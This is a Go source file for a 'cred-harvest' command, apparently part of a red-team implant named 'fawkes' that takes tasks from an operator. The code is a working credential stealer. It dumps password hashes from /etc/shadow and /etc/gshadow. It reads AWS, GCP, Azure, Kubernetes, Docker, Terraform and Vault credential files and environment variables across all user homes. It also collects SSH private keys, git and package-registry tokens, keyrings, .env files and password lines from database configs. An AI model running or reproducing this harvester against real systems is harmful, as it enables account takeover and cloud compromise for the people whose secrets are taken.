//go:build !windows

package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

type CredHarvestCommand struct{}

func (c *CredHarvestCommand) Name() string        { return "cred-harvest" }
func (c *CredHarvestCommand) Description() string { return "Harvest credentials from shadow, cloud configs, and application secrets (T1552)" }

type credHarvestArgs struct {
	Action string `json:"action"` // shadow, cloud, configs, all
	User   string `json:"user"`   // Filter by username (optional)
}

func (c *CredHarvestCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required. Actions: shadow, cloud, configs, all",
			Status:    "error",
			Completed: true,
		}
	}

	var args credHarvestArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	switch strings.ToLower(args.Action) {
	case "shadow":
		return credShadow(args)
	case "cloud":
		return credCloud(args)
	case "configs":
		return credConfigs(args)
	case "all":
		return credAll(args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s\nAvailable: shadow, cloud, configs, all", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

func credShadow(args credHarvestArgs) structs.CommandResult {
	var sb strings.Builder

	sb.WriteString("System Credential Files\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n\n")

	// /etc/shadow — hashed passwords
	sb.WriteString("--- /etc/shadow ---\n")
	if data, err := os.ReadFile("/etc/shadow"); err == nil {
		lines := strings.Split(strings.TrimRight(string(data), "\n"), "\n")
		count := 0
		for _, line := range lines {
			if line == "" {
				continue
			}
			parts := strings.SplitN(line, ":", 3)
			if len(parts) < 2 {
				continue
			}
			user := parts[0]
			hash := parts[1]

			// Filter by user if specified
			if args.User != "" && !strings.Contains(strings.ToLower(user), strings.ToLower(args.User)) {
				continue
			}

			// Skip locked/disabled accounts (* or ! or !! or !* prefix, or starts with !)
			if hash == "*" || hash == "" || strings.HasPrefix(hash, "!") {
				continue
			}

			sb.WriteString(fmt.Sprintf("  %s:%s\n", user, hash))
			count++
		}
		if count == 0 {
			sb.WriteString("  (no password hashes found — accounts may be locked)\n")
		}
	} else {
		sb.WriteString(fmt.Sprintf("  Error: %v (requires root)\n", err))
	}

	// /etc/passwd — check for password hashes in passwd (legacy)
	sb.WriteString("\n--- /etc/passwd (accounts with shells) ---\n")
	if data, err := os.ReadFile("/etc/passwd"); err == nil {
		lines := strings.Split(strings.TrimRight(string(data), "\n"), "\n")
		for _, line := range lines {
			parts := strings.Split(line, ":")
			if len(parts) < 7 {
				continue
			}
			user := parts[0]
			shell := parts[6]

			if args.User != "" && !strings.Contains(strings.ToLower(user), strings.ToLower(args.User)) {
				continue
			}

			// Only show accounts with real shells
			if strings.Contains(shell, "nologin") || strings.Contains(shell, "false") || shell == "/usr/sbin/nologin" || shell == "/bin/false" {
				continue
			}

			uid := parts[2]
			gid := parts[3]
			home := parts[5]
			sb.WriteString(fmt.Sprintf("  %s (uid=%s, gid=%s, home=%s, shell=%s)\n", user, uid, gid, home, shell))

			// Check if password hash is in passwd (legacy, rare but dangerous)
			if parts[1] != "x" && parts[1] != "*" && parts[1] != "" {
				sb.WriteString(fmt.Sprintf("    WARNING: Password hash in /etc/passwd: %s\n", parts[1]))
			}
		}
	}

	// /etc/gshadow if readable
	sb.WriteString("\n--- /etc/gshadow ---\n")
	if data, err := os.ReadFile("/etc/gshadow"); err == nil {
		lines := strings.Split(strings.TrimRight(string(data), "\n"), "\n")
		count := 0
		for _, line := range lines {
			parts := strings.SplitN(line, ":", 3)
			if len(parts) < 2 || parts[1] == "" || parts[1] == "!" || parts[1] == "*" {
				continue
			}
			sb.WriteString(fmt.Sprintf("  %s\n", line))
			count++
		}
		if count == 0 {
			sb.WriteString("  (no group passwords found)\n")
		}
	} else {
		sb.WriteString(fmt.Sprintf("  Error: %v\n", err))
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// Cloud credential file locations
var cloudCredPaths = []struct {
	name    string
	paths   []string
	envVars []string
}{
	{
		name: "AWS",
		paths: []string{
			"~/.aws/credentials",
			"~/.aws/config",
		},
		envVars: []string{"AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN"},
	},
	{
		name: "GCP",
		paths: []string{
			"~/.config/gcloud/credentials.db",
			"~/.config/gcloud/access_tokens.db",
			"~/.config/gcloud/application_default_credentials.json",
			"~/.config/gcloud/properties",
		},
		envVars: []string{"GOOGLE_APPLICATION_CREDENTIALS", "GCLOUD_PROJECT"},
	},
	{
		name: "Azure",
		paths: []string{
			"~/.azure/accessTokens.json",
			"~/.azure/azureProfile.json",
			"~/.azure/msal_token_cache.json",
		},
		envVars: []string{"AZURE_CLIENT_ID", "AZURE_CLIENT_SECRET", "AZURE_TENANT_ID"},
	},
	{
		name: "Kubernetes",
		paths: []string{
			"~/.kube/config",
		},
		envVars: []string{"KUBECONFIG"},
	},
	{
		name: "Docker",
		paths: []string{
			"~/.docker/config.json",
		},
		envVars: []string{"DOCKER_HOST", "DOCKER_CONFIG"},
	},
	{
		name: "Terraform",
		paths: []string{
			"~/.terraformrc",
			"~/.terraform.d/credentials.tfrc.json",
		},
		envVars: []string{"TF_VAR_access_key", "TF_VAR_secret_key"},
	},
	{
		name: "Vault (HashiCorp)",
		paths: []string{
			"~/.vault-token",
		},
		envVars: []string{"VAULT_TOKEN", "VAULT_ADDR"},
	},
}

func credCloud(args credHarvestArgs) structs.CommandResult {
	var sb strings.Builder

	sb.WriteString("Cloud & Infrastructure Credentials\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n\n")

	// Get all user home directories
	homes := getUserHomes(args.User)

	for _, cred := range cloudCredPaths {
		sb.WriteString(fmt.Sprintf("--- %s ---\n", cred.name))
		found := false

		// Check files
		for _, home := range homes {
			for _, pathTemplate := range cred.paths {
				path := strings.Replace(pathTemplate, "~", home, 1)
				info, err := os.Stat(path)
				if err != nil {
					continue
				}
				found = true
				sb.WriteString(fmt.Sprintf("  [FILE] %s (%d bytes)\n", path, info.Size()))

				// Read small files (<10KB) inline
				if info.Size() < 10240 && info.Size() > 0 {
					if data, err := os.ReadFile(path); err == nil {
						content := string(data)
						// Truncate if too long
						if len(content) > 2000 {
							content = content[:2000] + "\n... (truncated)"
						}
						sb.WriteString(fmt.Sprintf("  Content:\n%s\n", indentLines(content, "    ")))
					}
				}
			}
		}

		// Check env vars
		for _, env := range cred.envVars {
			if val := os.Getenv(env); val != "" {
				found = true
				// Mask long values
				display := val
				if len(display) > 40 {
					display = display[:20] + "..." + display[len(display)-10:]
				}
				sb.WriteString(fmt.Sprintf("  [ENV] %s=%s\n", env, display))
			}
		}

		if !found {
			sb.WriteString("  (not found)\n")
		}
		sb.WriteString("\n")
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// Application config patterns to search for
var configPatterns = []struct {
	name     string
	patterns []string
}{
	{"Environment Files", []string{".env", ".env.local", ".env.production"}},
	{"Database Configs", []string{
		"config/database.yml",
		"wp-config.php",
		"settings.py",
		"application.properties",
		"appsettings.json",
		"config.json",
	}},
	{"SSH Private Keys", []string{
		".ssh/id_rsa", ".ssh/id_ecdsa", ".ssh/id_ed25519", ".ssh/id_dsa",
	}},
	{"Git Credentials", []string{
		".git-credentials",
		".gitconfig",
	}},
	{"NPM/Pip/Gem Tokens", []string{
		".npmrc",
		".pypirc",
		".gem/credentials",
	}},
	{"GNOME Keyring", []string{
		".local/share/keyrings/login.keyring",
		".local/share/keyrings/user.keyring",
		".local/share/keyrings/default.keyring",
	}},
}

func credConfigs(args credHarvestArgs) structs.CommandResult {
	var sb strings.Builder

	sb.WriteString("Application Credentials & Configs\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n\n")

	homes := getUserHomes(args.User)

	for _, cfg := range configPatterns {
		sb.WriteString(fmt.Sprintf("--- %s ---\n", cfg.name))
		found := false

		for _, home := range homes {
			for _, pattern := range cfg.patterns {
				path := filepath.Join(home, pattern)
				info, err := os.Stat(path)
				if err != nil {
					continue
				}
				found = true
				sb.WriteString(fmt.Sprintf("  [FILE] %s (%d bytes)\n", path, info.Size()))

				// Read small files inline
				if info.Size() < 4096 && info.Size() > 0 {
					if data, err := os.ReadFile(path); err == nil {
						content := string(data)
						if len(content) > 1000 {
							content = content[:1000] + "\n... (truncated)"
						}
						sb.WriteString(fmt.Sprintf("  Content:\n%s\n", indentLines(content, "    ")))
					}
				}
			}
		}

		// Also check common system locations for database configs
		if cfg.name == "Database Configs" {
			systemPaths := []string{
				"/etc/mysql/debian.cnf",
				"/etc/postgresql/*/main/pg_hba.conf",
				"/var/lib/mysql/.my.cnf",
				"/etc/redis/redis.conf",
				"/etc/mongod.conf",
			}
			for _, pattern := range systemPaths {
				matches, _ := filepath.Glob(pattern)
				for _, path := range matches {
					info, err := os.Stat(path)
					if err != nil {
						continue
					}
					found = true
					sb.WriteString(fmt.Sprintf("  [SYSTEM] %s (%d bytes)\n", path, info.Size()))
					if info.Size() < 4096 && info.Size() > 0 {
						if data, err := os.ReadFile(path); err == nil {
							// Extract lines with passwords
							for _, line := range strings.Split(string(data), "\n") {
								lower := strings.ToLower(line)
								if strings.Contains(lower, "password") || strings.Contains(lower, "secret") || strings.Contains(lower, "token") || strings.Contains(lower, "key") {
									sb.WriteString(fmt.Sprintf("    %s\n", strings.TrimSpace(line)))
								}
							}
						}
					}
				}
			}
		}

		if !found {
			sb.WriteString("  (not found)\n")
		}
		sb.WriteString("\n")
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func credAll(args credHarvestArgs) structs.CommandResult {
	var sb strings.Builder

	shadow := credShadow(args)
	sb.WriteString(shadow.Output)
	sb.WriteString("\n")

	cloud := credCloud(args)
	sb.WriteString(cloud.Output)
	sb.WriteString("\n")

	configs := credConfigs(args)
	sb.WriteString(configs.Output)

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// getUserHomes returns home directories from /etc/passwd, optionally filtered by user
func getUserHomes(filterUser string) []string {
	var homes []string

	data, err := os.ReadFile("/etc/passwd")
	if err != nil {
		// Fallback: try current user's home
		if home, err := os.UserHomeDir(); err == nil {
			return []string{home}
		}
		return nil
	}

	for _, line := range strings.Split(string(data), "\n") {
		parts := strings.Split(line, ":")
		if len(parts) < 6 {
			continue
		}
		user := parts[0]
		home := parts[5]

		if filterUser != "" && !strings.Contains(strings.ToLower(user), strings.ToLower(filterUser)) {
			continue
		}

		// Skip system accounts with no real home
		if home == "" || home == "/" || home == "/nonexistent" || home == "/dev/null" {
			continue
		}

		if info, err := os.Stat(home); err == nil && info.IsDir() {
			homes = append(homes, home)
		}
	}

	return homes
}

func indentLines(s string, prefix string) string {
	lines := strings.Split(s, "\n")
	for i, line := range lines {
		if line != "" {
			lines[i] = prefix + line
		}
	}
	return strings.Join(lines, "\n")
}
